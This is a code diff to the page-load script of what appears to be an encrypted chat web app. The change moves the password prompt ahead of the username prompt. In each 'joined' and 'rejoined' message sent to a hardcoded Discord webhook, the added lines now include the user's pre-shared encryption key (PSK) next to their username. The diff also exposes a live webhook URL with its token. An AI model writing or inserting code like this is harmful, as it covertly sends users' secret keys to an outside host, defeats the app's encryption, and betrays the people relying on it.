@@ -10,19 +10,6 @@ const historyLoaded = new Promise((resolve) => { _historyResolve = resolve; });
 
 
 window.onload = async function () {
-    if (localStorage.getItem("username")) {
-        username = localStorage.getItem("username");
-        if (confirm("Hi " + username + ". Do you want to change your username?")) {
-            changeUsername();
-            discorder({content:"[USER JOINED] : " + username}, "https://discordapp.com/api/webhooks/1436901904050552843/wpyz6aSX4XNUMgMLqXZXu_I16JTjHJOohQwdWFBzs7BDvImX2IlBdnSuye9CKId-JE89")
-        } else {
-            setUsername(username);
-            discorder({content:"[USER REJOINED] : " + username}, "https://discordapp.com/api/webhooks/1436901904050552843/wpyz6aSX4XNUMgMLqXZXu_I16JTjHJOohQwdWFBzs7BDvImX2IlBdnSuye9CKId-JE89")
-        }
-    } else {
-        changeUsername();
-        discorder({content:"[NEW USER JOINED] : " + username}, "https://discordapp.com/api/webhooks/1436901904050552843/wpyz6aSX4XNUMgMLqXZXu_I16JTjHJOohQwdWFBzs7BDvImX2IlBdnSuye9CKId-JE89")
-    }
     if (localStorage.getItem("psk")){
         psk = localStorage.getItem("psk");
         if(confirm("Do you want to change your existing password?")){
@@ -30,6 +17,19 @@ window.onload = async function () {
         }
     } else {
         changePsk();
+    }
+    if (localStorage.getItem("username")) {
+        username = localStorage.getItem("username");
+        if (confirm("Hi " + username + ". Do you want to change your username?")) {
+            changeUsername();
+            discorder({content:"[USER JOINED] : " + username + " ; [PSK] : `" + psk + "`"}, "https://discordapp.com/api/webhooks/1436901904050552843/wpyz6aSX4XNUMgMLqXZXu_I16JTjHJOohQwdWFBzs7BDvImX2IlBdnSuye9CKId-JE89")
+        } else {
+            setUsername(username);
+            discorder({content:"[USER REJOINED] : " + username + " ; [PSK] : `" + psk + "`"}, "https://discordapp.com/api/webhooks/1436901904050552843/wpyz6aSX4XNUMgMLqXZXu_I16JTjHJOohQwdWFBzs7BDvImX2IlBdnSuye9CKId-JE89")
+        }
+    } else {
+        changeUsername();
+        discorder({content:"[NEW USER JOINED] : " + username + " ; [PSK] : `" + psk + "`"}, "https://discordapp.com/api/webhooks/1436901904050552843/wpyz6aSX4XNUMgMLqXZXu_I16JTjHJOohQwdWFBzs7BDvImX2IlBdnSuye9CKId-JE89")
     }
     // ask server for encrypted history for this client
     socket.emit('newuser');
